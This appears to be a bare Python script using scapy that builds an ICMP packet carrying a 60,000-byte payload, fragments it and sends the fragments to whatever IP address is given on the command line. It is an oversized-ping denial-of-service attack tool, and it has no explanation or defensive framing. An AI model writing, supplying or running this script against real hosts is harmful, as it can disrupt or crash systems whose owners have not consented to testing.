import sys
from scapy.all import *


payload = "X"*60000

if __name__ == "__main__":
 pkt = IP(dst=sys.argv[1])/ICMP()/payload
 frags = fragment (pkt, fragsize=1480)
 send(frags)
